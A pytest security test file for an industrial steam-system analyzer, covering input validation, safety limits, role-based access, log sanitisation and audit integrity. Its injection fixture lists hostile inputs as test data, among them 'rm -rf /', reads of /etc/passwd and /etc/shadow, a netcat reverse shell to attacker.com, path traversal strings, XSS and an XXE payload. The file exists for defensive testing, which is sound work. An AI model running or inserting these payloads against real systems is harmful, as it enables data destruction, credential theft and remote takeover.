# -*- coding: utf-8 -*-
"""
Security Tests for GL-003 STEAMWISE SteamSystemAnalyzer.

Comprehensive security validation covering:
- Input validation for steam parameters
- Pressure/temperature safety limits
- Access control tests

Author: GL-TestEngineer
Version: 1.0.0
Standards: GL-012 Test Patterns, OWASP Top 10, Industrial Safety Standards
"""

import pytest
import json
import re
import sys
from pathlib import Path
from typing import Dict, Any, List
from decimal import Decimal
from dataclasses import dataclass

# Add parent paths for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))


# ============================================================================
# FIXTURES
# ============================================================================

@pytest.fixture
def valid_steam_parameters():
    """Provide valid steam system parameters."""
    return {
        'pressure_bar': 10.0,
        'temperature_c': 180.0,
        'flow_rate_kg_hr': 5000.0,
        'steam_quality': 0.98
    }


@pytest.fixture
def injection_payloads():
    """Provide injection attack payloads for testing."""
    return {
        'sql_injection': [
            "'; DROP TABLE sensors; --",
            "1 OR 1=1",
            "' UNION SELECT * FROM users --",
            "1; DELETE FROM readings WHERE 1=1",
            "admin'--",
        ],
        'command_injection': [
            "; rm -rf /",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& cat /etc/shadow",
            "| nc attacker.com 4444 -e /bin/sh",
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
        ],
        'xss': [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",
        ],
        'xxe': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],
    }


@pytest.fixture
def safety_limits():
    """Provide safety limits for steam systems."""
    return {
        'pressure_bar': {
            'min': 0.0,
            'max': 300.0,
            'critical_high': 250.0,
            'warning_high': 200.0,
            'warning_low': 2.0,
        },
        'temperature_c': {
            'min': 0.0,
            'max': 600.0,
            'critical_high': 550.0,
            'warning_high': 450.0,
        },
        'flow_rate_kg_hr': {
            'min': 0.0,
            'max': 100000.0,
        },
        'steam_quality': {
            'min': 0.0,
            'max': 1.0,
        }
    }


@pytest.fixture
def mock_auth_provider():
    """Provide mock authentication provider."""
    class MockAuthProvider:
        def __init__(self):
            self.users = {
                'operator': {
                    'password': 'op_secure_pass_123',
                    'role': 'operator',
                    'permissions': ['read', 'monitor']
                },
                'engineer': {
                    'password': 'eng_secure_pass_456',
                    'role': 'engineer',
                    'permissions': ['read', 'monitor', 'analyze', 'configure']
                },
                'admin': {
                    'password': 'admin_secure_pass_789',
                    'role': 'admin',
                    'permissions': ['read', 'monitor', 'analyze', 'configure', 'control', 'admin']
                },
            }
            self.sessions = {}
            self.failed_attempts = {}

        def authenticate(self, username: str, password: str) -> Dict[str, Any]:
            # Rate limiting check
            if username in self.failed_attempts:
                if self.failed_attempts[username] >= 5:
                    return {'success': False, 'error': 'Account locked due to too many failed attempts'}

            if username not in self.users:
                self._record_failed_attempt(username)
                return {'success': False, 'error': 'Invalid credentials'}

            if self.users[username]['password'] != password:
                self._record_failed_attempt(username)
                return {'success': False, 'error': 'Invalid credentials'}

            # Successful authentication
            session_id = f"session_{username}_{id(self)}"
            self.sessions[session_id] = {
                'username': username,
                'role': self.users[username]['role'],
                'permissions': self.users[username]['permissions']
            }
            self.failed_attempts.pop(username, None)

            return {
                'success': True,
                'session_id': session_id,
                'role': self.users[username]['role']
            }

        def _record_failed_attempt(self, username: str):
            if username not in self.failed_attempts:
                self.failed_attempts[username] = 0
            self.failed_attempts[username] += 1

        def check_permission(self, session_id: str, permission: str) -> bool:
            if session_id not in self.sessions:
                return False
            return permission in self.sessions[session_id]['permissions']

        def get_session_role(self, session_id: str) -> str:
            if session_id not in self.sessions:
                return None
            return self.sessions[session_id]['role']

    return MockAuthProvider()


# ============================================================================
# INPUT VALIDATION TESTS
# ============================================================================

class TestInputValidation:
    """Tests for input validation security."""

    @pytest.mark.security
    def test_reject_sql_injection_in_sensor_id(self, injection_payloads):
        """Test SQL injection payloads are rejected in sensor IDs."""
        valid_sensor_id_pattern = r'^[A-Za-z][A-Za-z0-9_-]{0,63}$'

        for payload in injection_payloads['sql_injection']:
            # Sensor ID should not match valid pattern
            assert not re.match(valid_sensor_id_pattern, payload), \
                f"SQL injection payload accepted: {payload}"

    @pytest.mark.security
    def test_reject_command_injection(self, injection_payloads):
        """Test command injection payloads are rejected."""
        valid_input_pattern = r'^[a-zA-Z][a-zA-Z0-9_-]*$'

        for payload in injection_payloads['command_injection']:
            assert not re.match(valid_input_pattern, payload), \
                f"Command injection payload accepted: {payload}"

    @pytest.mark.security
    def test_reject_path_traversal(self, injection_payloads):
        """Test path traversal payloads are rejected."""
        # Safe path pattern - no parent directory references
        safe_path_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9_/.-]*$'

        for payload in injection_payloads['path_traversal']:
            # Check for suspicious patterns
            has_traversal = '..' in payload or '%2e' in payload.lower()
            assert has_traversal or not re.match(safe_path_pattern, payload), \
                f"Path traversal payload accepted: {payload}"

    @pytest.mark.security
    def test_reject_xss_payloads(self, injection_payloads):
        """Test XSS payloads are rejected."""
        xss_patterns = [
            r'<script',
            r'javascript:',
            r'onerror\s*=',
            r'onclick\s*=',
            r'\{\{.*\}\}',
        ]

        for payload in injection_payloads['xss']:
            is_xss = any(re.search(pattern, payload, re.IGNORECASE) for pattern in xss_patterns)
            assert is_xss, f"XSS payload not detected: {payload}"

    @pytest.mark.security
    def test_validate_numeric_pressure_input(self, valid_steam_parameters, safety_limits):
        """Test pressure input validation."""
        limits = safety_limits['pressure_bar']

        def validate_pressure(value):
            if not isinstance(value, (int, float)):
                return False, "Must be numeric"
            if value < limits['min']:
                return False, "Below minimum"
            if value > limits['max']:
                return False, "Above maximum"
            if value != value:  # NaN check
                return False, "Invalid number (NaN)"
            if value == float('inf') or value == float('-inf'):
                return False, "Invalid number (infinity)"
            return True, "Valid"

        # Valid value
        is_valid, msg = validate_pressure(valid_steam_parameters['pressure_bar'])
        assert is_valid, msg

        # Invalid values
        invalid_inputs = [
            (-10.0, "negative"),
            (500.0, "above max"),
            (float('nan'), "NaN"),
            (float('inf'), "infinity"),
            (float('-inf'), "negative infinity"),
        ]

        for value, desc in invalid_inputs:
            is_valid, msg = validate_pressure(value)
            assert not is_valid, f"Should reject {desc}: {value}"

    @pytest.mark.security
    def test_validate_temperature_input(self, valid_steam_parameters, safety_limits):
        """Test temperature input validation."""
        limits = safety_limits['temperature_c']

        def validate_temperature(value):
            if not isinstance(value, (int, float)):
                return False, "Must be numeric"
            if value < limits['min']:
                return False, "Below minimum"
            if value > limits['max']:
                return False, "Above maximum"
            if value != value:
                return False, "Invalid number (NaN)"
            return True, "Valid"

        # Valid
        is_valid, _ = validate_temperature(valid_steam_parameters['temperature_c'])
        assert is_valid

        # Invalid
        assert not validate_temperature(-50.0)[0]
        assert not validate_temperature(700.0)[0]
        assert not validate_temperature(float('nan'))[0]

    @pytest.mark.security
    def test_validate_steam_quality_bounds(self, valid_steam_parameters):
        """Test steam quality must be between 0 and 1."""
        def validate_quality(value):
            if not isinstance(value, (int, float)):
                return False
            if value < 0.0 or value > 1.0:
                return False
            return True

        assert validate_quality(0.98)
        assert validate_quality(0.0)
        assert validate_quality(1.0)

        assert not validate_quality(-0.1)
        assert not validate_quality(1.5)
        assert not validate_quality(float('inf'))

    @pytest.mark.security
    def test_json_payload_size_limit(self):
        """Test that oversized JSON payloads are rejected."""
        max_payload_size = 1024 * 1024  # 1 MB

        # Normal payload
        normal_payload = json.dumps({'pressure_bar': 10.0, 'temperature_c': 180.0})
        assert len(normal_payload) < max_payload_size

        # Oversized payload
        large_payload = json.dumps({'data': 'x' * (max_payload_size + 1)})
        assert len(large_payload) > max_payload_size

        def validate_payload_size(payload: str) -> bool:
            return len(payload) <= max_payload_size

        assert validate_payload_size(normal_payload)
        assert not validate_payload_size(large_payload)


# ============================================================================
# PRESSURE/TEMPERATURE SAFETY LIMITS TESTS
# ============================================================================

class TestSafetyLimits:
    """Tests for pressure and temperature safety limit enforcement."""

    @pytest.mark.security
    def test_pressure_critical_high_alarm(self, safety_limits):
        """Test critical high pressure triggers alarm."""
        limits = safety_limits['pressure_bar']

        def check_pressure_alarm(pressure: float) -> Dict[str, Any]:
            if pressure >= limits['critical_high']:
                return {'alarm': 'CRITICAL', 'action': 'emergency_shutdown'}
            elif pressure >= limits['warning_high']:
                return {'alarm': 'WARNING', 'action': 'reduce_load'}
            elif pressure <= limits['warning_low']:
                return {'alarm': 'WARNING', 'action': 'check_steam_generation'}
            return {'alarm': None, 'action': None}

        # Test critical alarm
        result = check_pressure_alarm(260.0)
        assert result['alarm'] == 'CRITICAL'
        assert result['action'] == 'emergency_shutdown'

        # Test warning alarm
        result = check_pressure_alarm(210.0)
        assert result['alarm'] == 'WARNING'

        # Test normal operation
        result = check_pressure_alarm(100.0)
        assert result['alarm'] is None

    @pytest.mark.security
    def test_temperature_critical_high_alarm(self, safety_limits):
        """Test critical high temperature triggers alarm."""
        limits = safety_limits['temperature_c']

        def check_temperature_alarm(temp: float) -> Dict[str, Any]:
            if temp >= limits['critical_high']:
                return {'alarm': 'CRITICAL', 'action': 'emergency_cooling'}
            elif temp >= limits['warning_high']:
                return {'alarm': 'WARNING', 'action': 'increase_cooling'}
            return {'alarm': None, 'action': None}

        # Critical
        result = check_temperature_alarm(560.0)
        assert result['alarm'] == 'CRITICAL'

        # Warning
        result = check_temperature_alarm(460.0)
        assert result['alarm'] == 'WARNING'

        # Normal
        result = check_temperature_alarm(180.0)
        assert result['alarm'] is None

    @pytest.mark.security
    def test_combined_safety_interlock(self, safety_limits):
        """Test combined pressure and temperature safety interlock."""
        @dataclass
        class SafetyState:
            pressure_bar: float
            temperature_c: float

        def evaluate_safety_interlock(state: SafetyState) -> Dict[str, Any]:
            p_limits = safety_limits['pressure_bar']
            t_limits = safety_limits['temperature_c']

            # Combined critical condition
            p_critical = state.pressure_bar >= p_limits['critical_high']
            t_critical = state.temperature_c >= t_limits['critical_high']

            if p_critical or t_critical:
                return {
                    'status': 'CRITICAL',
                    'interlock_active': True,
                    'action': 'immediate_shutdown'
                }

            # Combined warning
            p_warning = state.pressure_bar >= p_limits['warning_high']
            t_warning = state.temperature_c >= t_limits['warning_high']

            if p_warning and t_warning:
                return {
                    'status': 'HIGH_WARNING',
                    'interlock_active': False,
                    'action': 'reduce_load_priority'
                }

            if p_warning or t_warning:
                return {
                    'status': 'WARNING',
                    'interlock_active': False,
                    'action': 'monitor_closely'
                }

            return {
                'status': 'NORMAL',
                'interlock_active': False,
                'action': None
            }

        # Test critical interlock
        result = evaluate_safety_interlock(SafetyState(260.0, 180.0))
        assert result['status'] == 'CRITICAL'
        assert result['interlock_active'] is True

        # Test combined warning
        result = evaluate_safety_interlock(SafetyState(210.0, 460.0))
        assert result['status'] == 'HIGH_WARNING'

        # Test normal
        result = evaluate_safety_interlock(SafetyState(100.0, 180.0))
        assert result['status'] == 'NORMAL'

    @pytest.mark.security
    def test_rate_of_change_limits(self):
        """Test pressure/temperature rate of change limits."""
        max_pressure_change_per_second = 5.0  # bar/s
        max_temp_change_per_second = 10.0  # C/s

        def check_rate_of_change(
            current_value: float,
            previous_value: float,
            time_delta_s: float,
            max_rate: float
        ) -> Dict[str, Any]:
            rate = abs(current_value - previous_value) / time_delta_s if time_delta_s > 0 else 0

            if rate > max_rate:
                return {
                    'violation': True,
                    'rate': rate,
                    'max_rate': max_rate,
                    'action': 'rate_limit_exceeded'
                }
            return {'violation': False, 'rate': rate}

        # Pressure rate violation
        result = check_rate_of_change(110.0, 100.0, 1.0, max_pressure_change_per_second)
        assert result['violation'] is True

        # Normal pressure change
        result = check_rate_of_change(102.0, 100.0, 1.0, max_pressure_change_per_second)
        assert result['violation'] is False

    @pytest.mark.security
    def test_safety_limit_bypass_prevention(self):
        """Test that safety limits cannot be bypassed."""
        class SafetyController:
            def __init__(self):
                self.limits_enabled = True
                self.bypass_authorized = False

            def set_pressure(self, pressure: float, bypass_limits: bool = False) -> Dict[str, Any]:
                if bypass_limits and not self.bypass_authorized:
                    return {
                        'success': False,
                        'error': 'Unauthorized bypass attempt',
                        'security_alert': True
                    }

                if self.limits_enabled and not bypass_limits:
                    if pressure > 300.0:
                        return {
                            'success': False,
                            'error': 'Pressure exceeds safety limit'
                        }

                return {'success': True, 'pressure_set': pressure}

        controller = SafetyController()

        # Normal operation within limits
        result = controller.set_pressure(100.0)
        assert result['success'] is True

        # Blocked by safety limit
        result = controller.set_pressure(400.0)
        assert result['success'] is False
        assert 'safety limit' in result['error']

        # Unauthorized bypass attempt
        result = controller.set_pressure(400.0, bypass_limits=True)
        assert result['success'] is False
        assert result.get('security_alert') is True


# ============================================================================
# ACCESS CONTROL TESTS
# ============================================================================

class TestAccessControl:
    """Tests for access control and authentication."""

    @pytest.mark.security
    def test_valid_credentials_authentication(self, mock_auth_provider):
        """Test authentication with valid credentials succeeds."""
        result = mock_auth_provider.authenticate('admin', 'admin_secure_pass_789')

        assert result['success'] is True
        assert 'session_id' in result
        assert result['role'] == 'admin'

    @pytest.mark.security
    def test_invalid_credentials_rejection(self, mock_auth_provider):
        """Test authentication with invalid credentials fails."""
        # Wrong password
        result = mock_auth_provider.authenticate('admin', 'wrong_password')
        assert result['success'] is False

        # Unknown user
        result = mock_auth_provider.authenticate('unknown_user', 'any_password')
        assert result['success'] is False

    @pytest.mark.security
    def test_account_lockout_after_failed_attempts(self, mock_auth_provider):
        """Test account lockout after multiple failed attempts."""
        # Make 5 failed attempts
        for _ in range(5):
            mock_auth_provider.authenticate('admin', 'wrong_password')

        # 6th attempt should be locked
        result = mock_auth_provider.authenticate('admin', 'admin_secure_pass_789')
        assert result['success'] is False
        assert 'locked' in result['error'].lower()

    @pytest.mark.security
    def test_operator_read_only_permissions(self, mock_auth_provider):
        """Test operator role has read-only permissions."""
        result = mock_auth_provider.authenticate('operator', 'op_secure_pass_123')
        session_id = result['session_id']

        # Should have read/monitor
        assert mock_auth_provider.check_permission(session_id, 'read')
        assert mock_auth_provider.check_permission(session_id, 'monitor')

        # Should NOT have control permissions
        assert not mock_auth_provider.check_permission(session_id, 'control')
        assert not mock_auth_provider.check_permission(session_id, 'configure')
        assert not mock_auth_provider.check_permission(session_id, 'admin')

    @pytest.mark.security
    def test_engineer_extended_permissions(self, mock_auth_provider):
        """Test engineer role has extended but not admin permissions."""
        result = mock_auth_provider.authenticate('engineer', 'eng_secure_pass_456')
        session_id = result['session_id']

        # Should have read/analyze/configure
        assert mock_auth_provider.check_permission(session_id, 'read')
        assert mock_auth_provider.check_permission(session_id, 'analyze')
        assert mock_auth_provider.check_permission(session_id, 'configure')

        # Should NOT have admin/control
        assert not mock_auth_provider.check_permission(session_id, 'control')
        assert not mock_auth_provider.check_permission(session_id, 'admin')

    @pytest.mark.security
    def test_admin_full_permissions(self, mock_auth_provider):
        """Test admin role has full permissions."""
        result = mock_auth_provider.authenticate('admin', 'admin_secure_pass_789')
        session_id = result['session_id']

        all_permissions = ['read', 'monitor', 'analyze', 'configure', 'control', 'admin']

        for permission in all_permissions:
            assert mock_auth_provider.check_permission(session_id, permission), \
                f"Admin should have {permission} permission"

    @pytest.mark.security
    def test_invalid_session_rejection(self, mock_auth_provider):
        """Test invalid session ID is rejected."""
        fake_session = 'fake_session_12345'

        assert not mock_auth_provider.check_permission(fake_session, 'read')
        assert mock_auth_provider.get_session_role(fake_session) is None

    @pytest.mark.security
    def test_role_based_control_actions(self, mock_auth_provider):
        """Test control actions require appropriate role."""
        class ControlSystem:
            def __init__(self, auth_provider):
                self.auth = auth_provider

            def set_pressure_setpoint(self, session_id: str, pressure: float) -> Dict[str, Any]:
                if not self.auth.check_permission(session_id, 'control'):
                    return {
                        'success': False,
                        'error': 'Permission denied: control action requires control permission'
                    }
                return {'success': True, 'pressure_setpoint': pressure}

            def emergency_shutdown(self, session_id: str) -> Dict[str, Any]:
                if not self.auth.check_permission(session_id, 'control'):
                    return {'success': False, 'error': 'Permission denied'}
                return {'success': True, 'action': 'shutdown_initiated'}

        control = ControlSystem(mock_auth_provider)

        # Operator cannot control
        op_result = mock_auth_provider.authenticate('operator', 'op_secure_pass_123')
        result = control.set_pressure_setpoint(op_result['session_id'], 100.0)
        assert result['success'] is False
        assert 'Permission denied' in result['error']

        # Admin can control
        admin_result = mock_auth_provider.authenticate('admin', 'admin_secure_pass_789')
        result = control.set_pressure_setpoint(admin_result['session_id'], 100.0)
        assert result['success'] is True


# ============================================================================
# DATA PROTECTION TESTS
# ============================================================================

class TestDataProtection:
    """Tests for data protection and sensitive data handling."""

    @pytest.mark.security
    def test_no_secrets_in_logs(self):
        """Test that secrets are not included in log messages."""
        log_entries = [
            "User admin logged in successfully",
            "Configuration updated for BOILER-001",
            "Pressure reading: 10.5 bar from SENSOR-001",
            "Analysis completed with provenance hash abc123",
        ]

        sensitive_patterns = ['password', 'secret', 'api_key', 'token', 'credential']

        for log_entry in log_entries:
            for pattern in sensitive_patterns:
                assert pattern not in log_entry.lower(), \
                    f"Sensitive data '{pattern}' found in log: {log_entry}"

    @pytest.mark.security
    def test_password_not_in_response(self, mock_auth_provider):
        """Test that passwords are never returned in API responses."""
        result = mock_auth_provider.authenticate('admin', 'admin_secure_pass_789')

        # Check response doesn't contain password
        response_str = json.dumps(result)
        assert 'password' not in response_str.lower()
        assert 'admin_secure_pass_789' not in response_str

    @pytest.mark.security
    def test_sensitive_data_sanitization(self):
        """Test sensitive data is sanitized before logging/display."""
        def sanitize_for_log(data: Dict[str, Any]) -> Dict[str, Any]:
            sensitive_fields = ['password', 'api_key', 'token', 'secret', 'credential']
            sanitized = data.copy()

            for key in sanitized:
                if any(sf in key.lower() for sf in sensitive_fields):
                    sanitized[key] = '***REDACTED***'

            return sanitized

        original_data = {
            'username': 'admin',
            'password': 'secret123',
            'api_key': 'key-abc-123',
            'pressure_bar': 10.0
        }

        sanitized = sanitize_for_log(original_data)

        assert sanitized['password'] == '***REDACTED***'
        assert sanitized['api_key'] == '***REDACTED***'
        assert sanitized['username'] == 'admin'
        assert sanitized['pressure_bar'] == 10.0


# ============================================================================
# SAFETY INTERLOCK TESTS
# ============================================================================

class TestSafetyInterlocks:
    """Tests for safety interlock functionality."""

    @pytest.mark.security
    def test_interlock_bypass_requires_authorization(self):
        """Test that interlock bypass requires proper authorization."""
        class SafetyInterlock:
            def __init__(self):
                self.active = True
                self.bypass_key_inserted = False
                self.supervisor_approved = False

            def request_bypass(self, has_key: bool, supervisor_approval: bool) -> Dict[str, Any]:
                if not has_key:
                    return {'success': False, 'error': 'Physical bypass key required'}

                if not supervisor_approval:
                    return {'success': False, 'error': 'Supervisor approval required'}

                self.bypass_key_inserted = has_key
                self.supervisor_approved = supervisor_approval
                self.active = False

                return {
                    'success': True,
                    'warning': 'Safety interlock bypassed - proceed with extreme caution'
                }

        interlock = SafetyInterlock()

        # Cannot bypass without key
        result = interlock.request_bypass(has_key=False, supervisor_approval=True)
        assert result['success'] is False
        assert interlock.active is True

        # Cannot bypass without supervisor
        result = interlock.request_bypass(has_key=True, supervisor_approval=False)
        assert result['success'] is False
        assert interlock.active is True

        # Can bypass with both
        result = interlock.request_bypass(has_key=True, supervisor_approval=True)
        assert result['success'] is True
        assert 'warning' in result

    @pytest.mark.security
    def test_emergency_stop_always_active(self):
        """Test that emergency stop cannot be disabled remotely."""
        class EmergencyStop:
            def __init__(self):
                self.enabled = True
                self.triggered = False

            def trigger(self) -> Dict[str, Any]:
                self.triggered = True
                return {'success': True, 'action': 'emergency_stop_activated'}

            def disable_remote(self) -> Dict[str, Any]:
                return {
                    'success': False,
                    'error': 'Emergency stop cannot be disabled remotely for safety reasons'
                }

            def reset_local(self, local_key: bool) -> Dict[str, Any]:
                if not local_key:
                    return {'success': False, 'error': 'Local reset key required'}

                if not self.triggered:
                    return {'success': False, 'error': 'E-stop not triggered'}

                self.triggered = False
                return {'success': True, 'action': 'emergency_stop_reset'}

        estop = EmergencyStop()

        # Cannot disable remotely
        result = estop.disable_remote()
        assert result['success'] is False
        assert estop.enabled is True

        # Can trigger
        result = estop.trigger()
        assert result['success'] is True

        # Cannot reset without local key
        result = estop.reset_local(local_key=False)
        assert result['success'] is False

        # Can reset with local key
        result = estop.reset_local(local_key=True)
        assert result['success'] is True


# ============================================================================
# AUDIT COMPLIANCE TESTS
# ============================================================================

class TestAuditCompliance:
    """Tests for audit logging and compliance."""

    @pytest.mark.security
    def test_control_actions_logged(self):
        """Test all control actions are logged for audit."""
        audit_log = []

        def log_action(action: Dict[str, Any]):
            audit_log.append({
                'action': action['type'],
                'user': action.get('user', 'system'),
                'timestamp': action.get('timestamp', 'now'),
                'details': action.get('details', {})
            })

        # Simulate control actions
        log_action({'type': 'set_pressure', 'user': 'engineer', 'details': {'value': 100.0}})
        log_action({'type': 'emergency_stop', 'user': 'operator'})
        log_action({'type': 'configuration_change', 'user': 'admin', 'details': {'setting': 'max_pressure'}})

        assert len(audit_log) == 3

        # Verify all entries have required fields
        for entry in audit_log:
            assert 'action' in entry
            assert 'user' in entry
            assert 'timestamp' in entry

    @pytest.mark.security
    def test_authentication_attempts_logged(self, mock_auth_provider):
        """Test authentication attempts are logged."""
        auth_log = []

        def auth_with_logging(username: str, password: str):
            result = mock_auth_provider.authenticate(username, password)
            auth_log.append({
                'username': username,
                'success': result['success'],
                'timestamp': 'now'
            })
            return result

        # Successful attempt
        auth_with_logging('admin', 'admin_secure_pass_789')

        # Failed attempt
        auth_with_logging('admin', 'wrong_password')

        assert len(auth_log) == 2
        assert auth_log[0]['success'] is True
        assert auth_log[1]['success'] is False

    @pytest.mark.security
    def test_audit_log_immutability(self):
        """Test audit logs cannot be modified after creation."""
        class ImmutableAuditLog:
            def __init__(self):
                self._entries = []
                self._hashes = []

            def add_entry(self, entry: Dict[str, Any]):
                import hashlib
                import json

                entry_copy = entry.copy()
                entry_hash = hashlib.sha256(
                    json.dumps(entry_copy, sort_keys=True).encode()
                ).hexdigest()

                self._entries.append(entry_copy)
                self._hashes.append(entry_hash)

            def verify_integrity(self) -> bool:
                import hashlib
                import json

                for i, entry in enumerate(self._entries):
                    computed_hash = hashlib.sha256(
                        json.dumps(entry, sort_keys=True).encode()
                    ).hexdigest()

                    if computed_hash != self._hashes[i]:
                        return False

                return True

            def get_entries(self) -> List[Dict[str, Any]]:
                # Return copies to prevent modification
                return [e.copy() for e in self._entries]

        log = ImmutableAuditLog()
        log.add_entry({'action': 'test', 'user': 'admin'})
        log.add_entry({'action': 'test2', 'user': 'operator'})

        assert log.verify_integrity() is True
        assert len(log.get_entries()) == 2
